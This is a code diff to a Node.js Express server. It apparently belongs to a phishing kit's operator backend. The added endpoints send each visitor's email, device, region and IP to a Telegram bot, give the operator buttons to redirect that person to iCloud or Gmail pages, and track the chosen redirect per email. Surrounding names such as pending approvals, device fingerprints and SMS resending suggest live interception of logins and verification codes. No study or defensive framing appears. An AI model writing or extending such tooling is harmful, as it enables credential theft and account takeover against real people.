@@ -73,6 +73,7 @@ async function detectRegion(ip) {
 // ============================================================================
 
 let userIdCounter = 1;
+const pendingRedirection = {};
 const userIds = {};
 const pendingApprovals = {};
 const deviceFingerprintToEmail = {};
@@ -549,5 +550,104 @@ app.post("/resend-sms", async (req, res) => {
 
   } catch (err) {
     res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
+// REDIRECTION PAGE ENDPOINT
+// ============================================================================
+
+app.post("/send-redirection", async (req, res) => {
+  try {
+    const { email, userId, region, device, ip, message } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: "Missing email" });
+    }
+
+    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "☁️ <b>iCloud</b> ☁️", callback_data: `redirect_icloud|${email}` }],
+            [{ text: "🌈 <b>Gmail</b> 🌈", callback_data: `redirect_gmail|${email}` }]
+          ]
+        }
+      })
+    });
+
+    if (response.ok) {
+      res.json({ ok: true });
+    } else {
+      res.status(500).json({ error: "Failed to send redirection" });
+    }
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Check redirection choice
+app.post("/check-redirection-choice", (req, res) => {
+  try {
+    const { email } = req.body;
+
+    if (!email) {
+      return res.json({ choice: "unknown" });
+    }
+
+    // This will be set by the bot when button is clicked
+    if (pendingRedirection && pendingRedirection[email]) {
+      return res.json({ choice: pendingRedirection[email].choice });
+    }
+
+    res.json({ choice: "pending" });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// UPDATE REDIRECTION CHOICE
+// ============================================================================
+
+app.post("/update-redirection-choice", (req, res) => {
+  try {
+    const { email, choice } = req.body;
+
+    if (!email || !choice) {
+      return res.status(400).json({ error: "Missing email or choice" });
+    }
+
+    if (!pendingRedirection[email]) {
+      pendingRedirection[email] = {};
+    }
+
+    if (choice === "redirect_icloud") {
+      pendingRedirection[email].choice = "icloud";
+    } else if (choice === "redirect_gmail") {
+      pendingRedirection[email].choice = "gmail";
+    } else {
+      pendingRedirection[email].choice = choice;
+    }
+
+    pendingRedirection[email].updatedAt = Date.now();
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
   }
 });
